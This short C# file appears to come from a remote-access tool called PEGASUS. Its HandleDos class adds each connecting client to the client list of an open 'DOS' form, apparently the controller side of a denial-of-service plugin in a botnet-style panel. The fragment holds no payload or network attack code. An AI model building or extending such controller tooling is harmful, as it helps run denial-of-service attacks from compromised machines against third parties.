using System.Windows.Forms;
using PEGASUS.Connection;
using PEGASUS.Forms;
using PEGASUS.MessagePack;

namespace PEGASUS.Handle_Packet
	{
internal class HandleDos
{
	public void Add(Clients client, MsgPack unpack_msgpack)
	{
		try
		{
			FormDOS formDOS = (FormDOS)Application.OpenForms["DOS"];
			if (formDOS != null)
			{
				lock (formDOS.sync)
				{
					formDOS.PlguinClients.Add(client);
					return;
				}
			}
		}
		catch
		{
		}
	}
}
}